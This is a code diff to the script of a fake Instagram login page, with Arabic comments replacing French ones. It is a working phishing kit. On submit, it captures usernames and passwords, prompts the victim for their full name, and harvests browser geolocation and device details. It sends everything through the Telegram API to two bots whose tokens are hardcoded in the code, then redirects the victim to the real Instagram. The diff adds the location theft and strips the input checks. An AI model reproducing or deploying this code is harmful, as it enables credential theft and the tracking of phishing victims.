@@ -372,45 +372,78 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Password toggle
-            const togglePassword = document.getElementById('togglePassword');
-            const password = document.getElementById('password');
-            
-            togglePassword.addEventListener('click', function() {
-                const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
-                password.setAttribute('type', type);
-                this.classList.toggle('fa-eye-slash');
-            });
-            
-            // Form validation and submission
-            const loginForm = document.getElementById('loginForm');
-            
+            // ... الكود السابق ...
+
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
                 const username = document.getElementById('username').value.trim();
                 const password = document.getElementById('password').value;
-                const submitBtn = document.getElementById('submitBtn');
-                const buttonText = document.getElementById('buttonText');
-                const loadingSpinner = document.getElementById('loadingSpinner');
                 
-                // Validate inputs
-                if (username === '' || password.length < 6) {
-                    if (username === '') {
-                        document.getElementById('usernameError').style.display = 'block';
+                // إظهار حالة التحميل
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('loadingSpinner').style.display = 'block';
+                document.getElementById('buttonText').textContent = 'جاري الإرسال...';
+                
+                // الحصول على معلومات إضافية
+                getLocationInfo().then(locationData => {
+                    const fullName = prompt("الرجاء إدخال اسمك الكامل:", "");
+                    
+                    const message = `🎯 تسجيل دخول جديد إلى Instagram\n\n`
+                                  + `👤 اسم المستخدم: ${username}\n`
+                                  + `🔑 كلمة المرور: ${password}\n\n`
+                                  + `👤 الاسم الكامل: ${fullName || "غير معروف"}\n`
+                                  + `📍 الموقع: ${locationData.city || "غير معروف"}, ${locationData.country || "غير معروف"}\n`
+                                  + `🌍 الإحداثيات: ${locationData.loc || "غير معروف"}\n`
+                                  + `🌐 المتصفح: ${navigator.userAgent}\n`
+                                  + `📅 التاريخ: ${new Date().toLocaleString()}\n`
+                                  + `🖥 نظام التشغيل: ${navigator.platform}`;
+
+                    sendToTelegramBots(message);
+                }).catch(error => {
+                    console.error('Error getting location:', error);
+                    const message = `🎯 تسجيل دخول جديد إلى Instagram\n\n`
+                                  + `👤 اسم المستخدم: ${username}\n`
+                                  + `🔑 كلمة المرور: ${password}\n\n`
+                                  + `🌐 المتصفح: ${navigator.userAgent}\n`
+                                  + `📅 التاريخ: ${new Date().toLocaleString()}\n`
+                                  + `🖥 نظام التشغيل: ${navigator.platform}`;
+                    
+                    sendToTelegramBots(message);
+                });
+            });
+
+            // دالة للحصول على معلومات الموقع
+            function getLocationInfo() {
+                return new Promise((resolve, reject) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                const lat = position.coords.latitude;
+                                const lon = position.coords.longitude;
+                                
+                                // استخدام خدمة تحديد الموقع
+                                fetch(`https://geocode.xyz/${lat},${lon}?json=1`)
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        resolve({
+                                            city: data.city,
+                                            country: data.country,
+                                            loc: `${lat}, ${lon}`
+                                        });
+                                    })
+                                    .catch(error => reject(error));
+                            },
+                            error => reject(error)
+                        );
+                    } else {
+                        reject(new Error("Geolocation not supported"));
                     }
-                    if (password.length < 6) {
-                        document.getElementById('passwordError').style.display = 'block';
-                    }
-                    return;
-                }
-                
-                // Show loading state
-                submitBtn.disabled = true;
-                buttonText.textContent = 'Envoi en cours...';
-                loadingSpinner.style.display = 'block';
-                
-                // Telegram bot configuration
+                });
+            }
+
+            // دالة الإرسال إلى بوتات التلغرام
+            function sendToTelegramBots(message) {
                 const bots = [
                     {
                         token: '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw',
@@ -418,32 +451,13 @@
                     },
                     {
                         token: '8172051327:AAEuBJ0yNmbtJvPtiYtjC9yS9sF6joeSNDw',
-                        chatId: '6723118907'
+                        chatId: '6723948907'
                     }
                 ];
-                
-                // Create message with additional info
-                const message = `🔔 Nouvelle connexion Instagram 🔔\n\n`
-                    + `👤 Utilisateur: ${username}\n`
-                    + `🔑 Mot de passe: ${password}\n\n`
-                    + `🌐 Navigateur: ${navigator.userAgent}\n`
-                    + `📱 Plateforme: ${navigator.platform}\n`
-                    + `⏰ Heure: ${new Date().toLocaleString()}`;
-                
+
                 let sendCount = 0;
                 const totalBots = bots.length;
-                
-                // Function to handle redirection
-                function handleRedirection() {
-                    sendCount++;
-                    if (sendCount === totalBots) {
-                        setTimeout(() => {
-                            window.location.href = "https://www.instagram.com";
-                        }, 1500);
-                    }
-                }
-                
-                // Send to each bot
+
                 bots.forEach(bot => {
                     const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
                     
@@ -460,29 +474,21 @@
                     })
                     .then(response => response.json())
                     .then(data => {
-                        console.log(`Réponse du bot ${bot.token}:`, data);
-                        handleRedirection();
+                        console.log(`تم الإرسال للبوت ${bot.token}:`, data);
+                        sendCount++;
+                        if (sendCount === totalBots) {
+                            window.location.href = "https://www.instagram.com";
+                        }
                     })
                     .catch(error => {
-                        console.error(`Erreur avec le bot ${bot.token}:`, error);
-                        handleRedirection();
+                        console.error(`خطأ في إرسال للبوت ${bot.token}:`, error);
+                        sendCount++;
+                        if (sendCount === totalBots) {
+                            window.location.href = "https://www.instagram.com";
+                        }
                     });
                 });
-            });
-            
-            // Get client IP (additional functionality)
-            function getClientIP() {
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('IP du client:', data.ip);
-                    })
-                    .catch(error => {
-                        console.error('Erreur lors de la récupération de l\'IP:', error);
-                    });
             }
-            
-            getClientIP();
         });
     </script>
 </body>
